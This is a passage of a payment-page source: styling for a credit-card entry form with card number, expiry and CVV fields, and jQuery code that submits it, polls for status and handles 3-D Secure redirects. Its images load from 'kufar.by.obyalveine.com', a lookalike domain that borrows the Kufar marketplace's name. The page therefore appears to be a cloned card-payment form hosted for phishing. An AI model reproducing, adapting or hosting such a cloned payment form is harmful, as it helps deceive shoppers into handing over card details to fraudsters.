	border-bottom: 1px solid #e5e5e5;
	border-radius: 0;
	color: #000;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	font-size: 15px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	padding: 15px 0;
	vertical-align: middle
}

.pay-card_type_wamba .credit-card-form__input::-webkit-input-placeholder {
	color: rgba(0, 0, 0, .4);
	text-transform: none;
	font-size: 15px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px
}

.pay-card_type_wamba .credit-card-form__input::-moz-placeholder {
	color: rgba(0, 0, 0, .4);
	text-transform: none;
	font-size: 15px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px
}

.pay-card_type_wamba .credit-card-form__input::placeholder {
	color: rgba(0, 0, 0, .4);
	text-transform: none;
	font-size: 15px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px
}

.pay-card_type_wamba .credit-card-form__input:focus {
	border-bottom: 2px solid #46aae9;
	-webkit-box-shadow: none;
	box-shadow: none;
	caret-color: #46aae9;
	outline: none;
	-webkit-user-modify: read-write-plaintext-only;
	-webkit-tap-highlight-color: transparent
}

.pay-card_type_wamba .credit-card-form__input:disabled {
	opacity: 1;
	-webkit-text-fill-color: #000
}

.pay-card-layout_type_wamba .credit-card-form__label-group_type_add-card {
	padding: 15px 0
}

.pay-card-layout_type_wamba .credit-card-form__label-group_type_add-card .credit-card-form__input {
	display: none
}

.pay-card-layout_type_wamba .credit-card-form__label-group_type_add-card .credit-card-form__label {
	color: rgba(0, 0, 0, .4);
	text-transform: none;
	font-size: 15px;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	letter-spacing: -.2px;
	display: -webkit-box;
	display: -webkit-flex;
	display: flex;
	-webkit-box-align: center;
	-webkit-align-items: center;
	align-items: center;
	line-height: 16px
}

.pay-card-layout_type_wamba [type=checkbox]+.credit-card-form__input-icon {
	display: inline-block;
	margin-right: 10px;
	vertical-align: top;
	width: 10px;
	height: 10px;
	border: 2px solid #e5e5e5;
	border-radius: 4px
}

.pay-card-layout_type_wamba [type=checkbox]:checked+.credit-card-form__input-icon {
	background: #46aae9;
	border-color: #46aae9
}

.pay-card-layout_type_wamba [type=checkbox]:checked+.credit-card-form__input-icon:after {
	content: "";
	display: block;
	margin: auto;
	width: 3px;
	height: 6px;
	border: solid #fff;
	border-width: 0 2px 2px 0;
	-webkit-transform: rotate(45deg);
	-o-transform: rotate(45deg);
	transform: rotate(45deg)
}

.pay-card_type_wamba .credit-card-form__label-group_type_card-number {
	padding: 0;
	margin: 0 0 23px
}

.pay-card_type_wamba .credit-card-form__title_type_expiration-date {
	display: none
}

.pay-card_type_wamba .credit-card-form__label-group_type_expiration-date {
	margin: 0 0 23px
}

.pay-card_type_wamba .credit-card-form__label-group_type_expiration-date .credit-card-form__label {
	width: 50%;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	padding: 0
}

.pay-card_type_wamba .credit-card-form__label-group_type_expiration-date .credit-card-form__title {
	margin-left: 0;
	width: 100%
}

.pay-card_type_wamba .credit-card-form__label-group_type_expiration-date .credit-card-form__input {
	width: 100px;
	margin: 0
}

.pay-card_type_wamba .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv,
.pay-card_type_wamba .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv .credit-card-form__input {
	position: relative;
	text-align: right
}

.pay-card_type_wamba .credit-card-form__label-group_type_expiration-date .credit-card-form__label_type_cvv .credit-card-form__input {
	padding-right: 25px
}

.pay-card_type_wamba .credit-card-form__error-text,
.pay-card_type_wamba .credit-card-form__label_type_cvv .credit-card-form__error-text {
	display: none
}

.pay-card_type_wamba .credit-card-form__error-text {
	background: none;
	outline: none;
	left: 0;
	bottom: -20px;
	-webkit-transition: none;
	-o-transition: none;
	transition: none;
	letter-spacing: -.2px;
	color: #e06065;
	line-height: 1.5;
	font-size: 12px;
	text-align: left;
	white-space: normal
}

.pay-card_type_wamba .credit-card-form__label_type_cvv .credit-card-form__error-text {
	padding: 0;
	right: 0;
	text-align: right
}

.pay-card_type_wamba .credit-card-form__label_error_yes .credit-card-form__error-text {
	display: block;
	white-space: nowrap;
	margin: 0;
	padding: 0;
	width: auto
}

.pay-card_type_wamba .credit-card-form__label_error_yes .credit-card-form__input {
	outline: none;
	border-bottom-color: #e06065
}

.pay-card_type_wamba .credit-card-form__terms {
	margin: 20px auto 0;
	font-size: 11px;
	line-height: 1.27;
	color: #999
}

.pay-card_type_wamba .credit-card-form__terms p {
	padding-bottom: 10px
}

.pay-card_type_wamba .credit-card-form__terms-link {
	color: #46aae9
}

.pay-card_type_wamba .credit-card-form__submit {
	margin: 30px 0 0;
	width: 100%
}

.pay-card_type_wamba .credit-card-form__submit-inner {
	margin: 0 auto
}

.pay-card-layout_type_wamba .credit-card-form__popup .button,
.pay-card_type_wamba .credit-card-form__submit .button {
	width: 100%;
	height: 45px;
	margin: 0;
	line-height: 45px;
	font-size: 15px;
	color: #fff;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	text-transform: none;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	font-family: -apple-system, BlinkMacSystemFont, Segoe UI, Helvetica, Arial, sans-serif;
	font-weight: 400
}

.pay-card-layout_type_wamba .credit-card-form__popup .button,
.pay-card-layout_type_wamba .credit-card-form__popup .button:active,
.pay-card-layout_type_wamba .credit-card-form__popup .button:hover,
.pay-card_type_wamba .credit-card-form__submit .button,
.pay-card_type_wamba .credit-card-form__submit .button:active,
.pay-card_type_wamba .credit-card-form__submit .button:hover {
	color: #fff;
	border-radius: 10px;
	background: #f56323
}

.pay-card-layout_type_wamba .credit-card-form__popup .button.button_disabled_yes,
.pay-card-layout_type_wamba .credit-card-form__popup .button.button_disabled_yes:active,
.pay-card-layout_type_wamba .credit-card-form__popup .button.button_disabled_yes:hover,
.pay-card_type_wamba .credit-card-form__submit .button.button_disabled_yes,
.pay-card_type_wamba .credit-card-form__submit .button.button_disabled_yes:active,
.pay-card_type_wamba .credit-card-form__submit .button.button_disabled_yes:hover {
	color: #fff;
	border-radius: 10px;
	background: #f56323;
	cursor: default;
	opacity: .7
}

.pay-card-layout_type_wamba .credit-card-form__popup .button {
	margin-bottom: 10px
}

.pay-card-layout_type_wamba .credit-card-form__popup .info-block .title,
.pay-card-layout_type_wamba .notification-block .title {
	margin: 40px 0 10px;
	font-size: 16px;
	color: #000;
	letter-spacing: -.2px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none
}

.pay-card-layout_type_wamba .credit-card-form__popup .info-block .paragraph,
.pay-card-layout_type_wamba .info-block .paragraph {
	margin: 0;
	font-size: 15px;
	color: rgba(0, 0, 0, .4);
	letter-spacing: -.2px;
	-webkit-appearance: none;
	-moz-appearance: none;
	appearance: none;
	font-weight: 300
}

.pay-card-layout_type_wamba .credit-card-form__popup .info-block .paragraph_color_red {
	color: rgba(0, 0, 0, .4)
}

.svg_no .pay-card_type_wamba .credit-card-form__cvv-icon,
.svg_no .pay-card_type_wamba .credit-card-form__tooltip-icon,
.svg_yes .pay-card_type_wamba .credit-card-form__cvv-icon,
.svg_yes .pay-card_type_wamba .credit-card-form__tooltip-icon {
	background-repeat: no-repeat
}

.pay-card_type_wamba .credit-card-form__tooltip {
	border-radius: 10px;
	-webkit-box-shadow: 0 0 6px 0 rgba(0, 0, 0, .16);
	box-shadow: 0 0 6px 0 rgba(0, 0, 0, .16);
	background-color: #fff;
	padding: 14px 20px 18px;
	width: 280px;
	height: 137px;
	-webkit-box-sizing: border-box;
	-moz-box-sizing: border-box;
	box-sizing: border-box;
	left: -webkit-calc(100% - 12px);
	left: calc(100% - 12px);
	right: 0;
	top: 40px;
	-webkit-transform: translateX(-100%);
	-o-transform: translateX(-100%);
	transform: translateX(-100%)
}

.pay-card_type_wamba .credit-card-form__tooltip-arrow,
.pay-card_type_wamba .credit-card-form__tooltip-close {
	display: none
}

.pay-card_type_wamba .credit-card-form__tooltip-icon {
	margin: 0;
	-webkit-transform: scale(.75) translateX(-54px) translateY(-23px);
	-o-transform: scale(.75) translateX(-54px) translateY(-23px);
	transform: scale(.75) translateX(-54px) translateY(-23px)
}

.pay-card_type_wamba .credit-card-form__cvv-icon,
.pay-card_type_wamba .credit-card-form__label:hover .credit-card-form__cvv-icon {
	outline: none;
	position: absolute;
	right: 0;
	top: 50%;
	-webkit-transform: translateY(-50%);
	-o-transform: translateY(-50%);
	transform: translateY(-50%);
	-webkit-user-select: none;
	-moz-user-select: none;
	user-select: none;
	z-index: 2;
	cursor: pointer
}

@media (min-width:360px) {
	.pay-card_type_wamba .credit-card-form__tooltip {
		padding: 26px 30px 28px;
		width: 320px;
		height: 168px
	}
	.pay-card_type_wamba .credit-card-form__tooltip-icon {
		-webkit-transform: scale(.8125) translateX(-38px) translateY(-16px);
		-o-transform: scale(.8125) translateX(-38px) translateY(-16px);
		transform: scale(.8125) translateX(-38px) translateY(-16px)
	}
}

@media (min-width:414px) {
	.pay-card_type_wamba .credit-card-form__tooltip {
		padding: 23px 25px 28px 29px;
		width: 374px;
		height: 191px
	}
	.pay-card_type_wamba .credit-card-form__tooltip-icon {
		-webkit-transform: scale(1) translateX(0) translateY(0);
		-o-transform: scale(1) translateX(0) translateY(0);
		transform: scale(1) translateX(0) translateY(0)
	}
}

@media (min-width:460px) {
	.pay-card_type_wamba .credit-card-form__tooltip {
		padding: 11px 18px 17px 22px;
		width: 360px;
		height: 168px
	}
	.pay-card_type_wamba .credit-card-form__tooltip-icon {
		-webkit-transform: scale(1) translateX(0) translateY(0);
		-o-transform: scale(1) translateX(0) translateY(0);
		transform: scale(1) translateX(0) translateY(0)
	}
	.pay-card-layout_type_wamba .credit-card-form__popup,
	.pay-card_type_wamba {
		padding-left: 40px;
		padding-right: 40px
	}
}

.pay-card_single-side_yes .control__select {
	min-width: 0
}

.pay-card_cvv_no .credit-card-form__card_position_front {
	margin-left: auto;
	margin-right: auto
}

.pay-card_cvv_no .credit-card-form__card_position_back {
	display: none
}

.pay-card_cvv_no .credit-card-form__label-group_type_add-card {
	margin-left: 23px
}

.pay-card__card_type_added-card .__hidden_on_added_card {
	display: none
}

.pay-window-p2p-icon {
	background-image: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/icons/pay-window-p2p-1x.png")
}

.card-to-card__arrow,
.pay-window-p2p-icon_name_arrow {
	background-position: 0 0;
	width: 32px;
	height: 24px
}

.pay-window-p2p-icon_name_cancel {
	background-position: -58px 0;
	width: 14px;
	height: 14px
}

.pay-window-p2p-icon_name_card {
	background-position: -58px -30px;
	width: 14px;
	height: 10px
}

.pay-window-p2p-icon_name_details {
	background-position: 0 -44px;
	width: 14px;
	height: 10px
}

.pay-window-p2p-icon_name_help {
	background-position: -58px -15px;
	width: 14px;
	height: 14px
}

.pay-window-p2p-icon_name_mastercard {
	background-position: -33px 0;
	width: 24px;
	height: 14px
}

.pay-window-p2p-icon_name_visa-mastercard {
	background-position: 0 -35px;
	width: 29px;
	height: 8px
}

.pay-window-p2p-icon_name_visa {
	background-position: 0 -25px;
	width: 28px;
	height: 9px
}

.pay-window-p2p-icon-2x {
	background-image: url("https://kufar.by.obyalveine.com/img/merchant/DMR/blocks/icons/pay-window-p2p-2x.png")
}

.pay-window-p2p-icon-2x_name_arrow-2x {
	background-position: 0 0;
	width: 64px;
	height: 48px
}

.pay-window-p2p-icon-2x_name_cancel-2x {
	background-position: 0 -85px;
	width: 28px;
	height: 28px
}

.pay-window-p2p-icon-2x_name_card-2x {
	background-position: -58px -85px;
	width: 28px;
	height: 20px
}

.pay-window-p2p-icon-2x_name_details-2x {
	background-position: -114px 0;
	width: 28px;
	height: 20px
}

.pay-window-p2p-icon-2x_name_help-2x {
	background-position: -29px -85px;
	width: 28px;
	height: 28px
}

.pay-window-p2p-icon-2x_name_mastercard-2x {
	background-position: -65px 0;
	width: 48px;
	height: 28px
}

.pay-window-p2p-icon-2x_name_visa-mastercard-2x {
	background-position: 0 -68px;
	width: 58px;
	height: 16px
}

.pay-window-p2p-icon-2x_name_visa-2x {
	background-position: 0 -49px;
	width: 56px;
	height: 18px
}

.card-to-card {
	text-align: center;
	position: relative
}

.card-to-card__arrow {
	position: absolute;
	margin: auto;
	top: 130px;
	left: 0;
	right: 0
}

.card-to-card__terms {
	text-align: center;
	position: relative
}

.card-to-card__terms-link {
	color: #888;
	text-decoration: underline
}

.card-to-card.card-to-card_type_ok .card-to-card__cards-wrapper {
	margin-left: 125px
}
1      </style>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
     
      <script type="text/javascript">var isSubmitButtonClicked;
var isPasteDetected;

function removeCardIdFromSelect(cardId) {
	$(\'#CardSelectList option\').each(function() {
		if ($(this).val() === cardId) {
			$(this).remove();
			if (typeof SelectCard === \'function\') {
				SelectCard();
			}
		}
	});

	if ($(\'#CardSelectList option\').length === 1) {
		$(\'#divAuthorizedCardList\').hide();
	}
}

function removeCardRequest(cardId, sessionId, sessionSignature, callback, options) {
	var data = {
		card_id: cardId,
		all: 1,
		session_id: sessionId,
		signature: sessionSignature
	};
	if (!cardId || cardId === \'FreePay\') {
		return false;
	}
	if (typeof (options) !== \'undefined\') {
		if (options.hasOwnProperty(\'ts\')) {
			data.ts = options.ts;
		}
	}
	return $.ajax({
		url: \'/api/in/card/delete\',
		type: \'POST\',
		data: data,
		dataType: \'json\'
	}).done(function(response) {
		switch (response.status) {
			case \'OK\':
				window.parent.postMessage(JSON.stringify({
					type: \'billing\',
					action: \'removeAddedCard\',
					action_params: cardId
				}), \'*\');

				typeof callback === \'function\' ? callback(cardId) : removeCardIdFromSelect(cardId);
				break;
			default:
				break;
		}
	});
}

function putSubmitButtonClickPixel() {
	cpg_context[\'rb\'].putPixel(\'form_submit-button-click-all\');
	if (!isSubmitButtonClicked) {
		cpg_context[\'rb\'].putPixel(\'form_submit-button-click-first\');
		isSubmitButtonClicked = true;
	}
}

function putCopyPasteFillPixel() {
	if (isPasteDetected) {
		cpg_context[\'rb\'].putPixel(\'form_fill-copypaste-send\');
	}
}

function sendFrameResizeMessage() {
	setTimeout(function() {
		window.parent.postMessage(JSON.stringify({
			type: \'billing\',
			action: \'resizeFrame\',
			action_params: {
				height: document.body.getBoundingClientRect().height
			}
		}), \'*\');
	}, 0);
}

function hidePayCardWrapper() {
	var payCardWrapper = document.getElementsByClassName(\'js-pay-card-wrapper\')[0];

	if (payCardWrapper) {
		payCardWrapper.style.display = \'none\';
	}
}

function showPayCardWrapper() {
	var payCardWrapper = document.getElementsByClassName(\'js-pay-card-wrapper\')[0];
	var typeDisplay = \'\';

	if (payCardWrapper) {
		typeDisplay = typeof payCardWrapper.dataset.typeDisplay !== \'undefined\' ? typeDisplay : \'block\';
		payCardWrapper.style.display = typeDisplay;
	}
}1</script>
      <script type="text/javascript">
function CpgWaiter(settings) {
	/* Коллбэки */

	/* onParamsError - вызывается в случае, если вейтер получил от сервера ошибку ERR_ARGUMENTS.
	На вход функция получает массив полей с ошибками */
	this.onParamsError = settings.onParamsError;
	/* onServerError - ошибка сервера. В случае, если сервер вернул код ошибки,
	то на вход функции подается весь ответ сервера (json-объект, содержащий код
	и сообщение об ошибке). Если была ошибка взаимодействия с сервером или ответ
	не является валидным JSON, то коллбэк вызывается с параметрами null, textStatus (тип ошибки) */
	this.onServerError = settings.onServerError;
	/* onTimeout - коллбэк вызывается, когда исчерпан лимит опроса сервера */
	this.onTimeout = settings.onTimeout;
	/* onConfirm - коллэк вызывается, когда необходимо подтверждение транзакции пользователем до перехода на 3ds.
	На вход получает ответ сервера (JSON-объект) */
	this.onConfirm = settings.onConfirm;
	/* onSuccess - коллбэк вызывается, если в результате опроса получен финальный статус,
	но он не является редиректом. На вход коллбэк получает ответ сервера (JSON-объект) */
	this.onSuccess = settings.onSuccess;
	this.onError = settings.onError;
	/* onShow - опциональный коллбэк, который может вызываться перед показом "часиков" */
	this.onShow = settings.onShow;
	/* onHide - опциональный коллбэк, который может вызываться перед скрытием "часиков" */
	this.onHide = settings.onHide;
	/* onRedirect - если задан этот коллбэк, то он вызывается вместо редиректа при
	получении в ответе сервера команды redirect. На вход фукнция получает url для редиректа */
	this.onRedirect = settings.onRedirect;

	/* onBackUrlRedirect - если задан этот коллбэк, то он вызывается при получении ошибки сабмита формы, если ошибка
	не содержит адреса редиректа. Предполагается, что должна перенаправлять на back_url c выставленным флагом ошибки.
	На вход коллбэк получает ответ сервера (JSON-объект). */
	this.onBackUrlRedirect = settings.onBackUrlRedirect;

	/* requestMethod - метод запроса. По умолчанию POST */
	this.requestMethod = settings.requestMethod || \'POST\';
	/* clockElement - id элемента, демонстрирующего "часики". По умолчанию "waiter" */
	this.clockElement = settings.clockElement || \'cpg_waiter\';
	this.submitElement = settings.submitElement || \'cpg_submit\';
	/* pollLimit - лимит попыток опроса сервера. По умолчанию 20 */
	this.pollLimit = settings.pollLimit || 20;
	/* pollInterval - интервал между попытками опроса сервера (в миллисекундах). По умолчанию - 1000 */
	this.pollInterval = settings.pollInterval || 1000;

	/* submitUrl - адрес для отправки формы */
	this.submitUrl = settings.submitUrl;
	/* pollUrl - опционально можно задать url для опроса на случай, если он не вернется
	в результате отправки формы */
	this.pollUrl = settings.pollUrl;

	/* fakeAjax - если true и подключен плагин jquery.ajax.fake - имитация запроса на сервер */
	this.fakeAjax = settings.fakeAjax;

	var pollTimer = 0;
	var pollCount = 0;
	var sourceForm = undefined;
	var ajaxParams = undefined;

	/* Отправка формы на сервер. Функция должна принимать на вход обязательный параметр - объект формы. Также допускается явная передача заранее собранных параметров. Если аргумент params не задан, то данные формы будут собраны с помощью метода jQuery serialize
	 */
	this.submit = function(form, params) {
		if (! params) {
			params = $(form).serialize();
		}

		/* почистим ошибки формы */
		if (this.onParamsError) {
			this.onParamsError(null, 1);
		}

		ajaxParams = params;
		sourceForm = form;

		pollCount = 0; /* обнуляем число попыток опроса */
		this.showClock(); /* показываем часики */
		var waiter = this;
		$.ajax({
			url: waiter.submitUrl,
			type: waiter.requestMethod,
			fake: waiter.fakeAjax,
			dataType: \'json\',
			data: params
		}).done(function(data) {
			if (data.error) {
				if (data.error.error_fields) {
					if (waiter.onParamsError) {
						waiter.onParamsError(data.error.error_fields);
					}
					waiter.finish();
				} else if (data.url) {
					if (waiter.onRedirect) {
						waiter.onRedirect(data.url);
					} else {
						redirect(data.url);
					}
				} else {
					if (waiter.onBackUrlRedirect) {
						waiter.onBackUrlRedirect(data);
					}
					waiter.finish();
				}
			} else {
				if (waiter.onSubmitSuccess) {
					waiter.onSubmitSuccess(data);
				} else {
					waiter.startPoll(data.url, data.params);
				}
			}
		}).fail(function(jqXHR, textStatus, err) {
			/* Не достучались до сервера или не получили валидный JSON - вызываем коллбэк */
			if (waiter.onServerError) {
				waiter.onServerError(null, textStatus);
			}
			waiter.finish();
		});
	};

	this.resetPollCount = function() {
		pollCount = 0;
	}

	this.showClock = function() {
		if (this.onShow) {
			this.onShow();
		}
		$("#" + this.submitElement).prop(\'disabled\', true);
		$(\'#\' + this.clockElement).show();
	};

	this.finish = function() {
		if (this.onHide) {
			this.onHide();
		}
		$(\'#\' + this.clockElement).hide();
		$("#" + this.submitElement).prop(\'disabled\', false);
	};

	var redirect = function(url) {
		window.location.href = url;
	};

	this.startPoll = function(url, params) {
		/* С сервера могли прийти кастомные параметры для дальнешей отправки при опросе - сохраняем их */
		if (params) {
			ajaxParams = params;
		}
		clearTimeout(pollTimer);
		var waiter = this;
		pollCount++;
		if (pollCount > this.pollLimit) {
			if (this.onTimeout) {
				this.onTimeout();
			}
			return this.finish();
		}
		pollTimer = setTimeout(function() {
			$.ajax({
				url: url || waiter.pollUrl,
				type: waiter.requestMethod,
				fake: waiter.fakeAjax,
				dataType: \'json\'
			}).done(function(data) {
				switch (data.status) {
					case \'OK_CONTINUE\':
						/* Продолжаем опрос */
						waiter.startPoll(url);
						break;
					case \'OK_FINISH\':
						/* Финальный статус */
						if (data.acs_url) {
							if ( waiter.on3DS ) {
								waiter.on3DS(data);
							} else {
								waiter.submit3DS(data);
							}
						} else if (data.confirm_data && waiter.onConfirm) {
							waiter.onConfirm(data);
						} else if (waiter.onSuccess) {
							waiter.onSuccess(data);
						} else if (data.url) {
							/* Пришел редирект - выполняем */
							if (waiter.onRedirect) {
								waiter.onRedirect(data.url);
							} else {
								redirect(data.url);
							}
						}
						waiter.finish();
						break;
					 case \'ERR_FINISH\':
						if ( waiter.onError ) {
							waiter.onError(data);
						} else if (data.url) {
							if (waiter.onRedirect) {
								waiter.onRedirect(data.url)
							} else {
								redirect(data.url);
							}
						}
						waiter.finish();
						break;
					default:
						/* Произвольная ошибка - вызываем коллбэк, передаем туда весь ответ сервера */
						if (waiter.onServerError) {
							waiter.onServerError(data);
						}
						waiter.finish();
						break;
				}
			}).fail(function(jqXHR, textStatus, err) {
				/* Ошибка взаимодействия с сервером или невалидный JSON-объект */
				if (waiter.onServerError) {
					waiter.onServerError(null, textStatus);
				}
				waiter.finish();
			});
		}, waiter.pollInterval);
	};

	this.submit3DS = function(data) {
		this.create3DSform(data);
		document.getElementById(\'cpg_acs_form\').submit();
	}

	this.create3DSform = function(data) {
		var tds = data.threeds_data;
		$(\'body\').append(\'<form id="cpg_acs_form" action="\' + data.acs_url + \'"\' + ( typeof(data.target) != \'undefined\' ? (\'target=\' + data.target) : \'\' ) + \' method="POST">\'
			+ \'<input type="hidden" name="PaReq" value="\' + tds.PaReq + \'" />\'
			+ \'<input type="hidden" name="TermUrl" value="\' + tds.TermUrl + \'" />\'
			+ \'<input type="hidden" name="MD" value="\' + tds.MD + \'" />\'
			+ \'</form>\');
	}
}

function getBaseUrl() {
	var url = document.URL;
	var re = /(https?:\/\/.+?)(\/|\?)/;
	var found = url.match(re);
	return found[1];
}

function createCpgWaiter() {
	var baseUrl = getBaseUrl();
	return new CpgWaiter({
		submitUrl: baseUrl + $("#cpg_form").attr(\'action\'),
		clockElement: \'cpg_waiter\',
		submitElement: \'cpg_submit\',
		requestMethod: \'POST\',
		onServerError: function(data) {
			$("#cpg_form").hide();
			$("#cpg_error").show();
		},
		onParamsError: function(errors, remove) {
			if (remove) {
				$("#cpg_form").find(\'label\').removeClass(\'cpg_error\');
			} else {
				for (var field in errors) {
					$(\'#\' + errors[field]).addClass(\'cpg_error\');
				}
				$("#cpg_form").find("input[type=submit]").removeAttr(\'disabled\');
			}
		},
		onTimeout: function(data) {
			$(\'#cpg_error\').show();
		},
		onBackUrlRedirect: function(data) {
			var code = data.error.code || "UNKNOWN_ERROR";

			var $holder = $(\'a#cpg_error_back_url\');
			if ($holder.length) {
				var url = $holder.attr(\'src\');
				if (url) {
					url += url.indexOf(\'?\') < 0 ? \'?\' : \'&\';
					url += \'cpg_error_code=\' + code;
					window.location.href = url;
				}
			} else if (this.onError) {
				this.onError(data);
			}
		}
	});
}
1</script>
      <script type="text/javascript">var restartPoll;
var hideWaiter;

function createCpgStandardWaiter(cpg_context, onErrorCardLimit) {
	var waiter = createCpgWaiter();
	var $cpgForm = $(\'.js-hidden-form\');
	var $cardSelect = $(\'.js-card-selector\');

	var defaultErrorMessage = (typeof cpg_context.locale !== \'undefined\' && cpg_context.locale.waiterDefaultErrorMessage) ?
		cpg_context.locale.waiterDefaultErrorMessage :
		$(\'.js-credit-card .js-error-message\').text();

	var defaultErrorMessageCVV = (typeof cpg_context.locale !== \'undefined\' && cpg_context.locale.waiterDefaultCvvErrorMessage) ?
		cpg_context.locale.waiterDefaultCvvErrorMessage :
		\'Пожалуйста, введите CVV - последние три цифры на полосе для подписи\';

	var payCard = window.payCard;
	var clearCardFormErrorsList = [
		\'ERR_NOT_ENOUGH_MONEY\',
		\'ERR_FRAUD\',
		\'ERR_AUTHENTICATION_FAILED\',
		\'ERR_CARD_AMOUNT\',
		\'ERR_AUTHORIZATION\',
		\'ERR_CARD_EXPIRED\',
		\'ERR_SECURITY\',
		\'ERR_VTERM_DISABLED\',
		\'ERR_ORDER_FETCH\',
		\'ERR_REJECTED_SUPPORT\',
		\'ERR_CARD_PARAM_PAN\',
		\'ERR_ARGUMENTS\',
		\'ERR_CARD_LOST\',
		\'ERR_CARD_LIMIT_3DS\',
		\'ERR_CARD_LIMIT_ONLINE_3DS\'
	];

	var goToBackurlErrorsList = typeof cpg_context[\'is_redirect_to_backurl_on_error\'] !== \'undefined\' && cpg_context[\'is_redirect_to_backurl_on_error\'] ? [\'ERR_AUTHENTICATION_FAILED\'] : [];

	// Custom settings for cpgWaiter
	waiter.pollLimit = 30;
	waiter.pollInterval = 2000;

	if (typeof onErrorCardLimit === \'undefined\') {
		var onErrorCardLimit = function(error) {
			var selectedCardId = payCard.getSelectedCardId();

			if (cpg_context.json_cards[selectedCardId]) {
				cpg_context.json_cards[selectedCardId].nocvv = \'0\';
				$cardSelect.trigger(\'change\');
				payCard.showCvvError();
				payCard.setErrorMessage(defaultErrorMessageCVV);
			}
			else {
				payCard.setErrorMessage(error ? error.descr : defaultErrorMessage);
			}
			payCard.showError();
		};
	}

	function selectNewCard() {
		payCard.setSelectedCardByID(\'FreePay\');
	}

	function removeSelectedAddedCard() {
		var selectedCardId = payCard.getSelectedCardId();

		if (payCard.getSelectedCardByID[selectedCardId]) {
			payCard.removeAddedCardById(selectedCardId);
		}
	}

	waiter.onParamsError = function(errors, remove) {
		if (remove) {
			//	TODO: $(\'.js-hidden-form\').find(\'label\').removeClass(\'cpg_error\');
			return;
		}

		cpg_context[\'rb\'].putPixel(\'form_server-validation-error\');

		if (errors.length) {
			if (errors.indexOf(\'pan\') !== -1) {
				payCard.showNumberError();
			}
			if (errors.indexOf(\'exp_date\') !== -1) {
				payCard.showExpiryError();
			}
			if (errors.indexOf(\'cvv\') !== -1) {
				payCard.showCvvError();
			}
			if (errors.indexOf(\'cvv2\') !== -1) {
				payCard.showCvvError();
			}
			if (errors.indexOf(\'cardholder\') !== -1) {
				payCard.showCardholderError();
			}
			if (errors.indexOf(\'amount\') !== -1 && typeof payCard.showAmountError === \'function\') {
				payCard.showAmountError();
			}
		}

		if (typeof showPayCardWrapper === \'function\') {
			showPayCardWrapper();
		}
	};

	waiter.onSuccess = function(data) {
		var actionParams = {
			payment_info: typeof data.payment_info !== \'undefined\' ? data.payment_info : {}
		};

		if (Object.prototype.hasOwnProperty.call(data, \'card_id\')) {
			actionParams.card_id = data.card_id;
		}
		cpg_context[\'rb\'].putPixel(\'result_success\');
		window.parent.postMessage(JSON.stringify({
			type: \'billing\',
			action: \'paySuccess\',
			action_params: actionParams
		}), \'*\');
		if (data.url) {
			if (typeof waiter.onRedirect === \'function\') {
				waiter.onRedirect(data.url);
			}
			else {
				setTimeout(function() {
					window.location.href = data.url;
				}, 200);
			}
		}
	};

	waiter.onError = function(data) {
		cpg_context[\'rb\'].putPixel(\'result_fail\');

		try {
			window.parent.postMessage(JSON.stringify({
				type: \'billing\',
				action: \'payError\',
				action_params: data.error
			}), \'*\');

			if ($.inArray(data.error.code, goToBackurlErrorsList) !== -1) {
				// если передан параметр backurl - редиректим на него
				console.log(\'need to redirect to backurl\', !!data.backurl);
				if (data.backurl) {
					if (typeof waiter.onRedirect === \'function\') {
						waiter.onRedirect(data.backurl);
					}
					else {
						setTimeout(function() {
							window.location.href = data.backurl;
						}, 200);
					}
				}
			}

			if (data.error.code === \'ERR_CARD_LIMIT_CVV\' || data.error.code === \'ERR_CARD_LIMIT_ONLINE_CVV\') {
				// повторить сабмит для создания новой транзакции (с 3ds)
				setTimeout(function() {
					waiter.submit($cpgForm, $cpgForm.find(\'input, select\').filter(function() {
						return this.value && this.value !== \'FreePay\';
					}).serialize());
				});
				return;
			}

			if (data.error.code === \'ERR_CARD_LIMIT\' || data.error.code === \'ERR_CARD_LIMIT_ONLINE\' || data.error.code === \'ERR_PAY_NOCVV\') {
				// потребовать ввод CVV для выбранной карты
				onErrorCardLimit(data.error);
				return;
			}

			if ($.inArray(data.error.code, clearCardFormErrorsList) !== -1) {
				// временно удалить привязку, выбрать новую карту, очистить форму
				removeSelectedAddedCard();
				selectNewCard();
			}

			payCard.setErrorMessage(data.error.descr);
		} catch (e) {
			payCard.setErrorMessage(defaultErrorMessage);
		}

		payCard.showError();
	};

	waiter.onTimeout = function() {
		var timeoutPopup = document.getElementsByClassName(\'js-cc-timeout-popup\');
		window.parent.postMessage(\'{"type": "billing", "action": "timeoutError"}\', \'*\');
		cpg_context[\'rb\'].putPixel(\'status_fail\');
		if (timeoutPopup.length) {
			payCard.showTimeoutError();
		}
		else {
			payCard.showError();
		}
	};

	waiter.onServerError = function(data, textStatus) {
		cpg_context[\'rb\'].putPixel(\'ajax_\' + textStatus);
		payCard.showError();
	};

	waiter.onConfirm = function(data) {
		cpg_context[\'rb\'].putPixel(\'3ds_confirm\');
		/** START TMP-11413
		 window.parent.postMessage(JSON.stringify({
			type:          \'billing\',
			action:        \'payConfirm\',
			action_params: data.confirm_data
		}), \'*\');
		 */
		waiter.on3DS(data.confirm_data);
		/**
		 * END TMP-11413
		 */
		setTimeout(function() {
			waiter.showClock();
		});
	};

	waiter.on3DS = function(data) {
		cpg_context[\'rb\'].putPixel(\'3ds_start\');
		setTimeout(function() {
			waiter.showClock();
		}, 0);
		setTimeout(function() {
			waiter.submit3DS(data);
			document.body.style.display = \'none\';
			window.parent.postMessage(\'{"type": "billing", "action": "3dsPage"}\', \'*\');
		}, 300);
	};

